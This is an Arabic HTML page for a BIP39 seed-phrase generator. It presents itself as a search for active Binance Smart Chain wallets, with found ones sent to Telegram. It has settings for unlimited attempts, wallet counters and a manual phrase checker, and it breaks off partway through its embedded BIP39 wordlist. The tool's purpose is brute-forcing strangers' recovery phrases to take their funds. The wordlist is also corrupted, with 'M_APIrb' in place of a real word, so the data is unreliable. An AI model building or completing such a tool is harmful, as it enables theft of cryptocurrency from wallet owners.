<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مولد عبارات BIP39 والبحث عن المحافظ النشطة - شبكة BSC</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            direction: rtl;
            text-align: right;
        }

        .container {
            max-width: 340px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            backdrop-filter: blur(10px);
        }

        .header {
            background: linear-gradient(135deg, #f0b90b 0%, #f8d33a 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            font-weight: 700;
        }

        .header p {
            font-size: 1.1rem;
            opacity: 0.9;
        }

        .main-content {
            padding: 40px;
        }

        .control-panel {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid #e9ecef;
        }

        .control-group {
            margin-bottom: 25px;
        }

        .control-group label {
            display: block;
            font-weight: 600;
            margin-bottom: 8px;
            color: #495057;
            font-size: 1rem;
        }

        .control-group input,
        .control-group select,
        .control-group textarea {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            font-size: 1rem;
            transition: all 0.3s ease;
            background: white;
        }

        .control-group input:focus,
        .control-group select:focus,
        .control-group textarea:focus {
            outline: none;
            border-color: #f0b90b;
            box-shadow: 0 0 0 3px rgba(240, 185, 11, 0.1);
        }

        .button-group {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            justify-content: center;
            margin-top: 30px;
        }

        .btn {
            padding: 15px 30px;
            border: none;
            border-radius: 10px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            min-width: 150px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #f0b90b 0%, #f8d33a 100%);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(240, 185, 11, 0.3);
        }

        .btn-success {
            background: linear-gradient(135deg, #56ab2f 0%, #a8e6cf 100%);
            color: white;
        }

        .btn-success:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(86, 171, 47, 0.3);
        }

        .btn-danger {
            background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
            color: white;
        }

        .btn-danger:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255, 65, 108, 0.3);
        }

        .btn-secondary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-secondary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .btn-warning {
            background: linear-gradient(135deg, #ff9a00 0%, #ffcc00 100%);
            color: white;
        }

        .btn-warning:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255, 154, 0, 0.3);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
            box-shadow: none !important;
        }

        .status-panel {
            background: white;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid #e9ecef;
        }

        .status-panel h3 {
            color: #495057;
            margin-bottom: 20px;
            font-size: 1.3rem;
        }

        .status-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }

        .status-card {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            border: 1px solid #e9ecef;
        }

        .status-card .number {
            font-size: 2rem;
            font-weight: 700;
            color: #f0b90b;
            margin-bottom: 5px;
        }

        .status-card .label {
            color: #6c757d;
            font-size: 0.9rem;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e9ecef;
            border-radius: 4px;
            overflow: hidden;
            margin: 15px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #f0b90b 0%, #f8d33a 100%);
            width: 0%;
            transition: width 0.3s ease;
        }

        .log-panel {
            background: #212529;
            color: #ffffff;
            border-radius: 15px;
            padding: 20px;
            margin-top: 25px;
            max-height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            line-height: 1.4;
        }

        .log-entry {
            margin-bottom: 8px;
            padding: 5px 0;
            border-bottom: 1px solid #343a40;
        }

        .log-entry:last-child {
            border-bottom: none;
        }

        .log-timestamp {
            color: #6c757d;
            font-size: 0.8rem;
        }

        .log-success {
            color: #28a745;
        }

        .log-error {
            color: #dc3545;
        }

        .log-info {
            color: #17a2b8;
        }

        .wallet-display {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 10px;
            padding: 20px;
            margin: 15px 0;
            word-break: break-all;
        }

        .wallet-display .mnemonic {
            background: #e9ecef;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            margin-bottom: 10px;
        }

        .wallet-display .address {
            color: #495057;
            font-family: 'Courier New', monospace;
            font-size: 0.8rem;
        }

        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .alert {
            padding: 15px 20px;
            border-radius: 10px;
            margin: 15px 0;
            font-weight: 500;
        }

        .alert-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .alert-danger {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .alert-info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }

        .alert-warning {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }

        /* قسم العرض المباشر للعبارات */
        .live-display {
            background: #e8f5e8;
            border-radius: 10px;
            padding: 15px;
            margin-top: 15px;
            border: 1px solid #c3e6cb;
        }

        .live-display h5 {
            color: #155724;
            margin-bottom: 10px;
            font-size: 1rem;
        }

        .current-phrase {
            background: white;
            padding: 10px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            border: 1px solid #dee2e6;
            margin-bottom: 10px;
        }

        .phrase-status {
            font-size: 0.9rem;
            font-weight: 500;
        }

        .phrase-status.checking {
            color: #856404;
        }

        .phrase-status.active {
            color: #155724;
        }

        .phrase-status.empty {
            color: #721c24;
        }

        @media (max-width: 768px) {
            body {
                padding: 10px;
            }
            
            .header h1 {
                font-size: 2rem;
            }
            
            .header p {
                font-size: 1rem;
            }
            
            .main-content {
                padding: 20px;
            }
            
            .control-panel {
                padding: 20px;
            }
            
            .button-group {
                flex-direction: column;
            }
            
            .btn {
                width: 100%;
                min-width: auto;
            }
            
            .status-grid {
                grid-template-columns: repeat(2, 1fr);
                gap: 15px;
            }
            
            .status-card .number {
                font-size: 1.5rem;
            }
            
            .log-panel {
                font-size: 0.8rem;
                max-height: 200px;
            }
        }

        @media (max-width: 480px) {
            .header {
                padding: 20px;
            }
            
            .header h1 {
                font-size: 1.8rem;
            }
            
            .main-content {
                padding: 15px;
            }
            
            .control-panel {
                padding: 15px;
            }
            
            .status-grid {
                grid-template-columns: 1fr;
            }
            
            .status-card {
                padding: 15px;
            }
            
            .wallet-display .mnemonic {
                font-size: 0.8rem;
                padding: 10px;
            }
        }

        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .log-panel::-webkit-scrollbar {
            width: 8px;
        }

        .log-panel::-webkit-scrollbar-track {
            background: #343a40;
            border-radius: 4px;
        }

        .log-panel::-webkit-scrollbar-thumb {
            background: #6c757d;
            border-radius: 4px;
        }

        .log-panel::-webkit-scrollbar-thumb:hover {
            background: #adb5bd;
        }

        .test-result {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin-top: 15px;
            border-left: 5px solid #f0b90b;
        }

        .test-result.active {
            border-left-color: #28a745;
        }

        .test-result.inactive {
            border-left-color: #dc3545;
        }

        .test-result h4 {
            margin-bottom: 10px;
            color: #495057;
        }

        .test-result .balance {
            font-size: 1.2rem;
            font-weight: bold;
            margin: 10px 0;
        }

        .test-result .balance.positive {
            color: #28a745;
        }

        .test-result .balance.zero {
            color: #6c757d;
        }

        .test-result .transactions {
            margin: 10px 0;
        }

        .test-result .status {
            padding: 5px 10px;
            border-radius: 5px;
            font-weight: bold;
            display: inline-block;
        }

        .test-result .status.active {
            background: #d4edda;
            color: #155724;
        }

        .test-result .status.inactive {
            background: #f8d7da;
            color: #721c24;
        }

        .token-list {
            padding: 10px;
            background: #e9ecef;
            border-radius: 5px;
        }

        .token-item {
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
            border-bottom: 1px solid #ced4da;
        }

        .token-item:last-child {
            border-bottom: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔑 مولد عبارات BIP39 - شبكة BSC</h1>
            <p>البحث عن المحافظ النشطة وإرسالها إلى Telegram - شبكة Binance Smart Chain</p>
        </div>

        <div class="main-content">
            <div class="control-panel">
                <div class="control-group">
                    <label for="searchSpeed">سرعة البحث (مللي ثانية بين كل عبارة):</label>
                    <input type="number" id="searchSpeed" value="3000" min="1000" max="10000" step="500">
                </div>

                <div class="control-group">
                    <label for="maxAttempts">الحد الأقصى للمحاولات (0 = لا نهاية):</label>
                    <input type="number" id="maxAttempts" value="0" min="0" max="10000">
                </div>

                <div class="button-group">
                    <button id="startBtn" class="btn btn-success">
                        <span>🚀 بدء البحث</span>
                    </button>
                    <button id="stopBtn" class="btn btn-danger" disabled>
                        <span>⏹️ إيقاف البحث</span>
                    </button>
                    <button id="testTelegramBtn" class="btn btn-secondary">
                        <span>📱 اختبار Telegram</span>
                    </button>
                    <button id="clearLogsBtn" class="btn btn-primary">
                        <span>🗑️ مسح السجل</span>
                    </button>
                </div>
            </div>

            <!-- قسم اختبار العبارات يدويًا -->
            <div class="control-panel">
                <h3>🔍 اختبار عبارة BIP39 يدويًا</h3>
                <div class="control-group">
                    <label for="manualMnemonic">أدخل عبارة BIP39 (12 كلمة):</label>
                    <textarea id="manualMnemonic" rows="3" placeholder="أدخل عبارة الاسترجاع المكونة من 12 كلمة هنا..."></textarea>
                </div>
                <div class="button-group">
                    <button id="testManualBtn" class="btn btn-warning">
                        <span>🔍 فحص العبارة</span>
                    </button>
                </div>
                
                <!-- قسم العرض المباشر للعبارات -->
                <div id="liveDisplay" class="live-display" style="display: none;">
                    <h5>🔄 العبارة الحالية قيد الفحص:</h5>
                    <div id="currentPhrase" class="current-phrase"></div>
                    <div id="phraseStatus" class="phrase-status"></div>
                </div>
                
                <div id="manualTestResult" class="test-result" style="display: none;">
                    <!-- سيتم ملؤه ديناميكيًا -->
                </div>
            </div>

            <div class="status-panel">
                <h3>📊 إحصائيات العملية</h3>
                <div class="status-grid">
                    <div class="status-card">
                        <div class="number" id="totalGenerated">0</div>
                        <div class="label">إجمالي العبارات</div>
                    </div>
                    <div class="status-card">
                        <div class="number" id="activeWallets">0</div>
                        <div class="label">المحافظ النشطة</div>
                    </div>
                    <div class="status-card">
                        <div class="number" id="emptyWallets">0</div>
                        <div class="label">المحافظ الفارغة</div>
                    </div>
                    <div class="status-card">
                        <div class="number" id="errorCount">0</div>
                        <div class="label">الأخطاء</div>
                    </div>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <div id="currentStatus" class="alert alert-info">
                    جاهز للبدء... التطبيق يدعم الآن شبكة BSC مع البحث السريع
                </div>
            </div>

            <div class="log-panel" id="logPanel">
                <div class="log-entry log-info">
                    <span class="log-timestamp" id="currentTime"></span>
                    مرحباً بك في مولد عبارات BIP39 المحسن. يدعم الآن شبكة Binance Smart Chain مع البحث السريع.
                </div>
            </div>
        </div>
    </div>

    <!-- تحميل مكتبة ethers.js -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

    <script>
        // قائمة كلمات BIP39 الإنجليزية الرسمية (مدمجة من كود sell للسرعة)
        const BIP39_WORDLIST = [
            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
            "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
            "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit",
            "adult", "advance", "advice", "aerobic", "affair", "affect", "afford", "afraid", "after", "again",
            "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album",
            "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already",
            "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor",
            "ancient", "anger", "angle", "angry", "animal", "announce", "annual", "another", "answer", "antenna",
            "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "area",
            "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive",
            "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist",
            "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit",
            "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware",
            "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge", "bag",
            "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel",
            "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become", "beef",
            "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit", "best",
            "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology", "bird",
            "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless", "blind",
            "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil",
            "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss", "bottom",
            "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread", "breeze",
            "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze", "broom",
            "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb", "bulk",
            "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy", "butter",
            "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call", "calm",
            "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas", "canyon",
            "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry", "cart",
            "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category", "cattle",
            "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century", "ceremony",
            "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase", "chat",
            "cheap", "check", "cheek", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child",
            "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle",
            "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk",
            "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close",
            "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut",
            "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort",
            "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control",
            "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost",
            "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle",
            "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek",
            "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial",
            "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup",
            "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad",
            "damage", "damp", "dance", "danger", "daring", "dark", "dash", "date", "daughter", "dawn",
            "day", "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease",
            "deer", "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial",
            "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert",
            "design", "desk", "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram",
            "dial", "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma",
            "dinner", "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder",
            "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll",
            "dolphin", "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft",
            "dragon", "drama", "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip",
            "drive", "drop", "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch",
            "duty", "dwarf", "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east",
            "easy", "echo", "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight",
            "either", "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else",
            "embark", "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact",
            "end", "endless", "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy",
            "enlist", "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode",
            "equal", "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay",
            "essence", "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example",
            "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile",
            "exist", "exit", "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend",
            "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall",
            "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat",
            "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed",
            "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field",
            "figure", "file", "film", "filter", "final", "find", "fine", "finger", "finish", "fire",
            "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash",
            "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid",
            "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot",
            "force", "foreign", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster",
            "found", "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front",
            "frost", "frown", "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future",
            "gadget", "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic",
            "garment", "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre",
            "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl",
            "give", "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory",
            "glove", "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel",
            "gossip", "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity",
            "great", "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard",
            "guess", "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer",
            "hamster", "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk",
            "hazard", "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help",
            "hen", "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby",
            "hockey", "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn",
            "horror", "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human",
            "humble", "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid",
            "ice", "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image",
            "imitate", "immense", "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income",
            "increase", "index", "indicate", "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit",
            "initial", "inject", "injury", "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect",
            "inside", "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron",
            "island", "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous",
            "jeans", "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice",
            "jump", "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key",
            "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten",
            "kiwi", "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady",
            "lake", "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava",
            "law", "lawn", "lawsuit", "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture",
            "left", "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens", "leopard",
            "lesson", "letter", "level", "liar", "liberty", "library", "license", "life", "lift", "light",
            "like", "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "lizard",
            "load", "loan", "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery",
            "loud", "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury",
            "lying", "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make",
            "mammal", "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march",
            "margin", "marine", "market", "marriage", "mask", "mass", "master", "match", "material", "math",
            "matrix", "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal",
            "media", "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge", "merit",
            "merry", "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million", "mimic",
            "mind", "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix",
            "mixed", "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey", "monster",
            "month", "moon", "moral", "more", "morning", "mosquito", "mother", "motion", "motor", "mountain",
            "mouse", "move", "movie", "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom",
            "music", "must", "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow",
            "nasty", "nation", "nature", "near", "neck", "need", "needle", "neglect", "neighbor", "neither",
            "nephew", "nerve", "nest", "net", "network", "neutral", "never", "news", "next", "nice",
            "night", "noble", "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note",
            "nothing", "notice", "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey",
            "object", "oblige", "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor",
            "off", "offer", "office", "often", "oil", "okay", "old", "olive", "olympic", "omit",
            "once", "one", "onion", "online", "only", "open", "opera", "opinion", "oppose", "option",
            "orange", "orbit", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other",
            "outdoor", "outer", "output", "outside", "oval", "over", "own", "owner", "oxygen", "oyster",
            "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic",
            "panther", "paper", "parade", "parent", "park", "parrot", "part", "party", "pass", "patch",
            "path", "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear",
            "peasant", "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person",
            "pet", "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig",
            "pigeon", "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place",
            "planet", "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem",
            "poet", "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion",
            "position", "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise",
            "predict", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print",
            "priority", "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project",
            "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull",
            "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse",
            "push", "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quiet",
            "quilt", "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio",
            "rail", "rain", "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare",
            "rate", "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel", "rebuild",
            "recall", "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform", "refuse", "region",
            "regret", "regular", "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind",
            "remove", "render", "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require",
            "rescue", "resemble", "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion",
            "reveal", "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge",
            "rifle", "right", "rigid", "ring", "riot", "ripple", "rise", "risk", "ritual", "rival",
            "river", "road", "roast", "rob", "robot", "robust", "rocket", "romance", "roof", "rookie",
            "room", "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude", "rug",
            "rule", "run", "runway", "rural", "sad", "saddle", "sadness", "safe", "sail", "salad",
            "salmon", "salon", "salt", "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce",
            "sausage", "save", "say", "scale", "scan", "scare", "scatter", "scene", "scheme", "school",
            "science", "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search",
            "season", "seat", "second", "secret", "section", "security", "seed", "seek", "segment", "select",
            "sell", "seminar", "senior", "sense", "sentence", "series", "service", "session", "settle", "setup",
            "seven", "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff", "shield", "shift",
            "shine", "ship", "shirt", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove",
            "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign",
            "silent", "silk", "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister",
            "situate", "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull",
            "slab", "slam", "sleep", "slender", "slice", "slide", "slight", "slim", "slogan", "slot",
            "slow", "slush", "small", "smart", "smile", "smoke", "smooth", "snack", "snake", "snap",
            "sniff", "snow", "soap", "soccer", "social", "sock", "soda", "soft", "solar", "sold",
            "soldier", "solid", "solution", "solve", "someone", "song", "soon", "sorry", "sort", "soul",
            "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn", "speak", "special",
            "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit", "split",
            "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square",
            "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start",
            "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting",
            "stock", "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong",
            "struggle", "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such",
            "sudden", "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super",
            "supply", "supreme", "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain",
            "swallow", "swamp", "swap", "swear", "sweet", "swift", "swim", "swing", "switch", "sword",
            "symbol", "symptom", "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk",
            "tank", "tape", "target", "task", "taste", "tattoo", "taxi", "teach", "team", "tell",
            "ten", "tenant", "tennis", "tent", "term", "test", "text", "thank", "that", "theme",
            "then", "theory", "there", "they", "thing", "this", "thought", "three", "thrive", "throw",
            "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny", "tip",
            "tired", "tissue", "title", "toast", "tobacco", "today", "toddler", "toe", "together", "toilet",
            "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic",
            "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower", "town",
            "toy", "track", "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel",
            "tray", "treat", "tree", "trend", "trial", "tribe", "trick", "trigger", "trim", "trip",
            "trophy", "trouble", "truck", "true", "truly", "trumpet", "trust", "truth", "try", "tube",
            "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle", "twelve", "twenty", "twice",
            "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncle",
            "uncover", "under", "undo", "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe",
            "unknown", "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper",
            "upset", "urban", "urge", "usage", "use", "used", "useful", "useless", "usual", "utility",
            "vacant", "vacuum", "vague", "valid", "valley", "valve", "van", "vanish", "vapor", "various",
            "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "M_APIrb", "verify", "version",
            "very", "vessel", "veteran", "viable", "vibe", "vicious", "victory", "video", "view", "village",
            "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal",
